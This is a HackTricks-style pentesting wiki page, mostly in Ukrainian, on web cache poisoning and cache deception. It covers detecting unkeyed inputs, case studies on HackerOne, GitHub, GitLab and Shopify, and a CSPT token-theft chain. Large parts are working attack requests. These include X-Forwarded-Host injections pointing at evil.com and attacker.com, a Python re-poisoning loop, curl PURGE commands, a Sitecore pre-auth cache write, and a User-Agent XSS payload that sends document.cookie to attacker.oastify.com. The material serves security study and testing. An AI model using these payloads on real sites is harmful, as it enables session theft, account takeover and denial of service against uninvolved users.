# Cache Poisoning and Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## Різниця

> **Яка різниця між web cache poisoning та web cache deception?**
>
> - У випадку **web cache poisoning**, атакуючий змушує застосунок зберегти шкідливий контент у кеші, і цей контент потім віддається з кешу іншим користувачам застосунку.
> - У випадку **web cache deception**, атакуючий змушує застосунок зберегти в кеші конфіденційний контент, що належить іншому користувачу, а потім отримує цей контент з кешу.

## Cache Poisoning

Cache poisoning спрямований на маніпулювання клієнтським кешем з метою примусити клієнтів завантажувати ресурси, які є несподіваними, частковими або під контролем атакуючого. Обсяг впливу залежить від популярності ураженої сторінки, оскільки інфікована відповідь подається виключно користувачам, які відвідують сторінку в період забруднення кешу.

The execution of a cache poisoning assault involves several steps:

1. **Визначення неключових вхідних даних**: Це параметри, які, хоча і не потрібні для кешування запиту, можуть змінювати відповідь, повернену сервером. Виявлення цих входів є критичним, оскільки їх можна використати для маніпуляції кешем.
2. **Експлуатація неключових вхідних даних**: Після ідентифікації неключових вхідних даних наступним кроком є з'ясування, як зловживати цими параметрами, щоб змінити відповідь сервера на користь атакуючого.
3. **Гарантування збереження отруєної відповіді в кеші**: Останній крок — упевнитися, що змодифікована відповідь зберігається в кеші. Таким чином будь-який користувач, що отримує доступ до ураженої сторінки під час отруєння кешу, отримає підроблену відповідь.

### Виявлення: Перевірка HTTP заголовків

Зазвичай, коли відповідь була **збережена в кеші**, буде наявний **заголовок, що це вказує**, ви можете перевірити, на які заголовки слід звертати увагу в цьому дописі: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Виявлення: Кешування кодів помилок

Якщо ви думаєте, що відповідь зберігається в кеші, ви можете спробувати **send requests with a bad header**, які мають відповідати з **status code 400**. Потім спробуйте отримати запит звичайним шляхом і якщо **response is a 400 status code**, ви знаєте, що це вразливо (і ви навіть можете виконати DoS).

You can find more options in:


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Однак зауважте, що **іноді такі коди статусу не кешуються**, тож цей тест може бути ненадійним.

### Виявлення: Ідентифікація та оцінка неключових вхідних даних

Ви можете використати [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) для **brute-force parameters and headers**, які можуть **змінювати відповідь сторінки**. Наприклад, сторінка може використовувати заголовок `X-Forwarded-For` щоб вказати клієнту завантажити скрипт звідти:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Викликати шкідливу відповідь від back-end сервера

Після того, як параметр/заголовок ідентифіковано, перевірте, як він **очищається** і **де** він **відображається** або впливає на відповідь від сервера. Чи можна ним зловживати (виконати XSS або завантажити JS-код під вашим контролем? виконати DoS?...)

### Get the response cached

Після того як ви **виявили** **сторінку**, яку можна зловживати, який **параметр**/**заголовок** використовувати і **як** його **зловживати**, потрібно змусити сторінку потрапити в кеш. Залежно від ресурсу, який ви намагаєтеся записати в кеш, це може зайняти деякий час — можливо доведеться робити запити кілька секунд.

The header **`X-Cache`** in the response could be very useful as it may have the value **`miss`** when the request wasn't cached and the value **`hit`** when it is cached.\
The header **`Cache-Control`** is also interesting to know if a resource is being cached and when will be the next time the resource will be cached again: `Cache-Control: public, max-age=1800`

Another interesting header is **`Vary`**. This header is often used to **indicate additional headers** that are treated as **part of the cache key** even if they are normally unkeyed. Therefore, if the user knows the `User-Agent` of the victim he is targeting, he can poison the cache for the users using that specific `User-Agent`.

One more header related to the cache is **`Age`**. It defines the times in seconds the object has been in the proxy cache.

When caching a request, be **careful with the headers you use** because some of them could be **used unexpectedly** as **keyed** and the **victim will need to use that same header**. Always **test** a Cache Poisoning with **different browsers** to check if it's working.

### Foundational cache poisoning case studies

#### HackerOne global redirect via `X-Forwarded-Host`

- The origin templated redirects and canonical URLs with `X-Forwarded-Host`, but the cache key only used the `Host` header, so a single response poisoned every visitor to `/`.
- Poison with:
```http
GET / HTTP/1.1
Host: hackerone.com
X-Forwarded-Host: evil.com
```
- Негайно повторно зробіть запит до `/` без підробленого заголовка; якщо редирект зберігається, у вас є глобальний примітив підміни хоста, який часто підвищує відбиті редиректи/Open Graph-посилання до збережених issues.

#### DoS репозиторію GitHub через `Content-Type` + `PURGE`

- Анонімний трафік ключувався лише за шляхом, тоді як бекенд переходив у стан помилки, коли бачив несподіваний `Content-Type`. Така відповідь з помилкою могла кешуватися для кожного неавторизованого користувача репозиторію.
- GitHub також (випадково) обробляв `PURGE`, дозволяючи нападникові очистити коректний запис і змусити кеші витягти отруєний варіант за вимогою:
```bash
curl -H "Content-Type: invalid-value" https://github.com/user/repo
curl -X PURGE https://github.com/user/repo
```
- Завжди порівнюйте аутентифіковані та анонімні cache keys, fuzz рідко keyed заголовки, такі як `Content-Type`, і probe на наявність відкритих cache-maintenance verbs, щоб автоматизувати re-poisoning.

#### Shopify cross-host persistence loops

- Multi-layer caches іноді вимагають кількох ідентичних hits перед комітом нового об'єкта. Shopify повторно використовував той самий cache на численних локалізованих hosts, тож persistence означало вплив на багато properties.
- Використовуйте короткі automation loops для repeatedly reseed:
```python
import requests, time
for i in range(100):
requests.get("https://shop.shopify.com/endpoint",
headers={"X-Forwarded-Host": "attacker.com"})
time.sleep(0.1)
print("attacker.com" in requests.get("https://shop.shopify.com/endpoint").text)
```
- Після відповіді `hit`, скануйте інші хости/ресурси, які ділять той самий простір імен кешу, щоб продемонструвати радіус ураження між доменами.

#### JS редирект ресурсу → stored XSS ланцюжок

- Приватні програми часто хостять спільний JS, такий як `/assets/main.js`, на десятках субдоменів. Якщо `X-Forwarded-Host` впливає на логіку редиректу для цих ресурсів, але не враховується в ключі кешу, кешована відповідь стає 301 до attacker JS, що призводить до stored XSS у всіх місцях, де імпортується цей ресурс.
```http
GET /assets/main.js HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```
- Зіставте, які хости повторно використовують однаковий asset path, щоб ви могли довести компрометацію кількох субдоменів.

#### GitLab static DoS via `X-HTTP-Method-Override`

- GitLab роздавав static bundles з Google Cloud Storage, який підтримує `X-HTTP-Method-Override`. Перевизначення GET на HEAD повертало кешований `200 OK` з `Content-Length: 0`, а edge cache ігнорував HTTP-метод при генерації ключа.
```http
GET /static/app.js HTTP/1.1
Host: gitlab.com
X-HTTP-Method-Override: HEAD
```
- Один запит замінив JS bundle на порожнє тіло для кожного GET, фактично DoSing UI. Завжди тестуйте method overrides (`X-HTTP-Method-Override`, `X-Method-Override`, тощо) проти статичних ресурсів і перевіряйте, чи кеш залежить від методу.

#### HackerOne зациклення статичного ресурсу через `X-Forwarded-Scheme`

- Rails’ Rack middleware довіряло `X-Forwarded-Scheme` для вирішення, чи застосовувати HTTPS. Підміна `http` для `/static/logo.png` спричинила кешований 301, тому всі користувачі надалі отримували редіректи (або зациклення) замість ресурсу:
```http
GET /static/logo.png HTTP/1.1
Host: hackerone.com
X-Forwarded-Scheme: http
```
- Поєднуйте scheme spoofing з host spoofing, коли це можливо, щоб створювати незворотні редіректи для високовидимих ресурсів.

#### Cloudflare невідповідність регістру host-header

- Cloudflare нормалізував заголовок `Host` для cache keys, але пересилав необроблений регістр до origins. Надсилання `Host: TaRgEt.CoM` викликало альтернативну поведінку в origin routing/templating, при цьому заповнювався канонічний lowercase cache bucket.
```http
GET / HTTP/1.1
Host: TaRgEt.CoM
```
- Перелічуйте CDN-тенанти, відтворюючи хости з різним регістром (та інші нормалізовані заголовки) і diff закешовану відповідь із відповіддю origin, щоб виявити shared-platform cache poisonings.

#### Red Hat Open Graph meta poisoning

- Вставляння `X-Forwarded-Host` всередині Open Graph тегів перетворювало reflected HTML injection у stored XSS після того, як CDN закешував сторінку. Використовуйте harmless cache buster під час тестування, щоб не зашкодити production users:
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."?><script>alert(1)</script>
```
- Social media scrapers використовують кешовані Open Graph теги, тож один poisoned entry розповсюджує payload значно далі за прямих відвідувачів.

## Приклади експлуатації

### Найпростіший приклад

Заголовок на кшталт `X-Forwarded-For` відображається в відповіді без санітизації.\
Ви можете відправити базовий XSS payload і poison the cache, тож кожен, хто заходить на сторінку, буде XSSed:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Зверніть увагу, що це отруїть запит до `/en?region=uk`, а не до `/en`_

### Cache poisoning to DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Cache poisoning through CDNs

У **[цьому writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** пояснюється наступний простий сценарій:

- CDN кешуватиме будь-що під `/share/`
- CDN НЕ декодуватиме і не нормалізуватиме `%2F..%2F`, тому це може бути використано як **path traversal для доступу до інших чутливих локацій, які будуть кешовані**, наприклад `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Вебсервер ВІДПОВІСТЬ декодує та нормалізує `%2F..%2F`, і відповість з `/api/auth/session`, який **містить the auth token**.

### Using web cache poisoning to exploit cookie-handling vulnerabilities

Cookies також можуть відображатися у відповіді сторінки. Якщо ви зможете зловживати цим, щоб викликати, наприклад, XSS, ви зможете експлуатувати XSS у кількох клієнтів, які завантажують шкідливу кешовану відповідь.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Зверніть увагу, що якщо вразливий cookie часто використовується користувачами, регулярні запити будуть очищати cache.

### Генерація розбіжностей за допомогою роздільників, нормалізації та крапок <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Перевірте:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning із використанням path traversal для викрадення API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Цей розбір пояснює**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) як було можливо вкрасти OpenAI API key за допомогою URL на кшталт `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`, оскільки все, що відповідає `/share/*`, буде cached без нормалізації URL з боку Cloudflare, яка виконувалася, коли запит доходив до web server.

Це також краще пояснюється в:


{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Використання кількох headers для експлуатації web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Іноді вам потрібно буде **exploit several unkeyed inputs**, щоб мати змогу зловживати cache. Наприклад, ви можете знайти **Open redirect**, якщо встановите `X-Forwarded-Host` на домен, яким ви керуєте, і `X-Forwarded-Scheme` на `http`. Якщо **server** **forwarding** всі **HTTP** запити **to HTTPS** і використовує заголовок `X-Forwarded-Scheme` як ім'я домену для редиректу, ви зможете контролювати, куди буде вказувати redirect.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Експлуатація при обмеженому `Vary`header

Якщо ви виявили, що заголовок **`X-Host`** використовується як **domain name to load a JS resource**, але у відповіді заголовок **`Vary`** вказує **`User-Agent`**, то потрібно знайти спосіб exfiltrate `User-Agent` жертви і poison the cache, використовуючи цей `User-Agent`:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Надішліть GET request, помістивши його і в URL, і в body. Якщо web server використовує значення з body, але cache server кешує значення з URL, то будь-хто, хто заходить на цей URL, фактично отримає parameter з body. Як-от vuln, який знайшов James Kettle на сайті Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
Є лабораторія PortSwigger з цього приводу: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloacking

Наприклад, у ruby-серверах можна розділяти **parameters** символом **`;`** замість **`&`**. Це можна використати, щоб помістити значення непозначених параметрів всередину позначених і зловживати цим.

Portswigger lab: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Дізнайтеся тут, як виконувати [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

Інструмент [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) можна використовувати для автоматичного тестування на Web Cache Poisoning. Він підтримує багато різних techniques і є висококонфігурованим.

Приклад використання: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Цей реальний шаблон поєднує примітив відображення заголовка з поведінкою CDN/WAF, щоб надійно отруїти кешований HTML, який подається іншим користувачам:

- Головний HTML відображав недовірений заголовок запиту (наприклад, `User-Agent`) у виконуваний контекст.
- CDN видаляв cache headers, але існував внутрішній/origin cache. CDN також auto-cached запити, що закінчуються статичними розширеннями (наприклад, `.js`), тоді як WAF застосовував слабший огляд контенту для GET запитів статичних ресурсів.
- Особливості потоку запитів дозволяли запиту до шляху `.js` впливати на cache key/variant, що використовувався для наступного головного HTML, дозволяючи міжкористувацький XSS через відображення заголовків.

Практичний рецепт (спостерігався у популярному CDN/WAF):

1) З чистої IP-адреси (уникати попередніх понижень через репутацію), встановіть шкідливий `User-Agent` через браузер або Burp Proxy Match & Replace.  
2) У Burp Repeater підготуйте групу з двох запитів та використайте "Send group in parallel" (single-packet mode працює найкраще):
- Перший запит: GET до ресурсу `.js` на тому ж origin, відправляючи шкідливий `User-Agent`.
- Негайно після: GET головну сторінку (`/`).
3) Гонка маршрутизації CDN/WAF разом з auto-cached `.js` часто засіває отруєний cached HTML варіант, який потім подається іншим відвідувачам, що ділять ті самі умови cache key (наприклад, ті самі `Vary` виміри, як `User-Agent`).

Приклад навантаження заголовка (щоб exfiltrate non-HttpOnly cookies):
```http
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Багато CDN приховують заголовки кешу; poisoning може проявлятися лише через багато-годинні цикли оновлення. Використовуйте кілька IP з різних точок спостереження і обмежуйте швидкість запитів, щоб уникнути спрацьовування ліміту запитів (rate-limit) або тригерів репутації.
- Використання IP з тієї ж хмари, що й CDN, іноді покращує консистентність маршрутизації.
- Якщо присутній суворий CSP, це все одно працює, якщо рефлексія виконується в основному HTML-контексті і CSP дозволяє inline виконання або обходиться через контекст.

Impact:

- Якщо сесійні куки не мають прапора `HttpOnly`, можливий zero-click ATO шляхом масової ексфільтрації `document.cookie` від усіх користувачів, яким віддано poisoned HTML.


### Sitecore pre‑auth HTML cache poisoning (unsafe XAML Ajax reflection)

A Sitecore‑specific pattern enables unauthenticated writes to the HtmlCache by abusing pre‑auth XAML handlers and AjaxScriptManager reflection. When the `Sitecore.Shell.Xaml.WebControl` handler is reached, an `xmlcontrol:GlobalHeader` (derived from `Sitecore.Web.UI.WebControl`) is available and the following reflective call is allowed:
```http
POST /-/xaml/Sitecore.Shell.Xaml.WebControl
Content-Type: application/x-www-form-urlencoded

__PARAMETERS=AddToCache("key","<html>…payload…</html>")&__SOURCE=ctl00_ctl00_ctl05_ctl03&__ISEVENT=1
```
This writes arbitrary HTML under an attacker‑chosen cache key, enabling precise poisoning once cache keys are known.

For full details (cache key construction, ItemService enumeration and a chained post‑auth deserialization RCE):

{{#ref}}
../../network-services-pentesting/pentesting-web/sitecore/README.md
{{#endref}}

## Уразливі приклади

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS пересилав фрагмент у URL без його видалення і генерував cache key лише з host, path і query (ігноруючи фрагмент). Тому запит `/#/../?r=javascript:alert(1)` було відправлено на бекенд як `/#/../?r=javascript:alert(1)`, а cache key не містив payload, тільки host, path і query.

### 403 та Storage Buckets

Cloudflare раніше кешував відповіді 403. Спроба доступу до S3 або Azure Storage Blobs з некоректними заголовками Authorization призводила до відповіді 403, яка кешувалась. Хоча Cloudflare перестав кешувати відповіді 403, така поведінка може все ще зустрічатися в інших проксі-сервісах.

### Ін’єкція параметрів, що впливають на ключ

Кеші часто включають певні GET-параметри в cache key. Наприклад, Varnish від Fastly кешував параметр `size` у запитах. Однак якщо версія параметра, закодована як URL (наприклад, `siz%65`), також була відправлена з некоректним значенням, cache key формувався з правильного параметра `size`. Проте бекенд обробляв значення з URL-кодованого параметра. URL-кодування другого параметра `size` призводило до його ігнорування кешем, але до використання бекендом. Присвоєння цьому параметру значення 0 призводило до кешованої помилки 400 Bad Request.

### Правила User-Agent

Деякі розробники блокують запити з user-agent'ами, що відповідають інструментам з великою кількістю трафіку, таким як FFUF або Nuclei, щоб зменшити навантаження на сервер. Іронічно, що такий підхід може вводити вразливості, такі як cache poisoning і DoS.

### Неприпустимі поля заголовків

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) вказує допустимі символи в іменах заголовків. Заголовки, що містять символи поза вказаним діапазоном **tchar**, ідеально мали б викликати відповідь 400 Bad Request. У практиці сервери не завжди дотримуються цього стандарту. Помітний приклад — Akamai, який пересилає заголовки з недійсними символами і кешує будь-яку помилку 400, якщо тільки заголовок `cache-control` відсутній. Було виявлено експлуатований патерн, коли відправка заголовка з нелегальним символом, наприклад `\`, призводила до кешованої помилки 400 Bad Request.

### Пошук нових заголовків

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

The goal of Cache Deception is to make clients **load resources that are going to be saved by the cache with their sensitive information**.

Насамперед зверніть увагу, що **розширення** такі як `.css`, `.js`, `.png` тощо зазвичай **налаштовані** так, щоб **зберігатися** в **кеші**. Тому, якщо ви звертаєтеся до `www.example.com/profile.php/nonexistent.js`, кеш, ймовірно, збереже відповідь, бо бачить `.js` **розширення**. Але якщо **додаток** відповідає з **конфіденційним** вмістом користувача, що зберігається на _www.example.com/profile.php_, ви можете **вкрасти** цей вміст у інших користувачів.

Інші речі для перевірки:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Use lesser known extensions such as_ `.avif`

Another very clear example can be found in this write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
У прикладі пояснюється, що якщо ви завантажуєте неіснуючу сторінку, наприклад _http://www.example.com/home.php/non-existent.css_, то буде повернено вміст _http://www.example.com/home.php_ (**зі чутливою інформацією користувача**) і кеш-сервер збереже результат.\
Потім **attacker** може отримати доступ до _http://www.example.com/home.php/non-existent.css_ у своєму браузері і побачити **конфіденційну інформацію** користувачів, які заходили раніше.

Зверніть увагу, що **cache proxy** має бути **налаштований** так, щоб **кешувати** файли **на основі** **розширення** файлу (_.css_), а не на основі content-type. У прикладі _http://www.example.com/home.php/non-existent.css_ буде мати content-type `text/html` замість `text/css` mime type.

Дізнайтеся тут, як виконувати [Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

### CSPT-assisted authenticated cache poisoning (Account Takeover)

This pattern combines a Client-Side Path Traversal (CSPT) primitive in a Single-Page App (SPA) with extension-based CDN caching to publicly cache sensitive JSON that was originally only available via an authenticated API call.

Загальна ідея:

- Чутливий API endpoint вимагає кастомний auth header і правильно позначений як non-cacheable на origin.
- Додавання суфікса, що виглядає як статичний (наприклад, .css), змушує CDN трактувати шлях як статичний ресурс і кешувати відповідь, часто без варіацій по чутливих заголовках.
- SPA містить CSPT: він конкатенує керований користувачем сегмент шляху в URL API, приєднуючи auth header жертви (наприклад, X-Auth-Token). Вставляючи ../.. traversal, автентикований fetch перенаправляється на кешований варіант шляху (…/v1/token.css), що призводить до того, що CDN кешує token JSON жертви під публічним cache key.
- Будь-хто потім може GETнути той самий cache key без автентифікації і отримати token жертви.

Example

- Sensitive endpoint (non-cacheable at origin):
```
GET /v1/token HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-cache, no-store, must-revalidate
X-Cache: Miss from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- Статичний на вигляд суфікс примушує CDN кешувати ресурс:
```
GET /v1/token.css HTTP/1.1
Host: api.example.com
X-Auth-Token: <REDACTED>
Accept: application/json

HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: max-age=86400, public
X-Cache: Hit from cdn

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```
- CSPT in SPA додає auth header та дозволяє traversal:
```js
const urlParams = new URLSearchParams(window.location.search);
const userId = urlParams.get('userId');

const apiUrl = `https://api.example.com/v1/users/info/${userId}`;

fetch(apiUrl, {
method: 'GET',
headers: { 'X-Auth-Token': authToken }
});
```
- Ланцюжок експлуатації:
1. Заманіть жертву на URL, який вставляє dot-segments у параметр шляху SPA, наприклад:
- [https://example.com/user?userId=../../../v1/token.css](https://example.com/user?userId=../../../v1/token.css)
2. SPA виконує автентифікований fetch до:
- [https://api.example.com/v1/users/info/../../../v1/token.css](https://api.example.com/v1/users/info/../../../v1/token.css)
3. Нормалізація браузера зводить це до:
- [https://api.example.com/v1/token.css](https://api.example.com/v1/token.css)
4. CDN трактує .css як статичний ресурс і кешує JSON з Cache-Control: public, max-age=...
5. Публічне отримання: будь-хто може потім виконати GET https://api.example.com/v1/token.css і отримати кешований JSON токена.

Передумови

- SPA виконує автентифікований fetch/XHR до того ж API origin (або cross-origin з працюючим CORS) і додає чутливі заголовки або bearer токени.
- Edge/CDN застосовує кешування на основі розширення для шляхів, що виглядають як статичні (наприклад, *.css, *.js, images) і не варіює ключ кешу за чутливим заголовком.
- Origin для базової точки доступу некешований (коректно), але варіант з суфіксом розширення дозволений або не заблокований правилами edge.

Перелік перевірок

- Визначте чутливі динамічні endpoints і спробуйте суфікси на кшталт .css, .js, .jpg, .json. Шукайте Cache-Control: public/max-age і X-Cache: Hit (або еквівалент, напр., CF-Cache-Status), поки контент лишається JSON.
- Знайдіть клієнтський код, який конкатенує керований користувачем ввід у API-шляхи, одночасно додаючи auth-заголовки. Інжектуйте ../ послідовності, щоб перенаправити автентифікований запит до цільового endpoint.
- Підтвердіть, що автентифікований заголовок присутній у перенаправленому запиті (наприклад, у проксі або в логах на сервері) і що CDN кешує відповідь під пройденим шляхом.
- Зі свіжого контексту (без авторизації) запитайте той самий шлях і підтвердіть, що секретний JSON віддається з кешу.

## Automatic Tools

- [**toxicache**](https://github.com/xhzeem/toxicache): Golang scanner to find web cache poisoning vulnerabilities in a list of URLs and test multiple injection techniques.

## References

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)
- [watchTowr Labs – Sitecore XP cache poisoning → RCE](https://labs.watchtowr.com/cache-me-if-you-can-sitecore-experience-platform-cache-poisoning-to-rce/)
- [Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [CSPT overview by Matan Berson](https://matanber.com/blog/cspt-levels/)
- [CSPT presentation by Maxence Schmitt](https://www.youtube.com/watch?v=O1ZN_OCfNzg)
- [PortSwigger: Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [Cache Poisoning Case Studies Part 1: Foundational Attacks Behind a $100K+ Vulnerability Class](https://herish.me/blog/cache-poisoning-case-studies-part-1-foundational-attacks/)



{{#include ../../banners/hacktricks-training.md}}
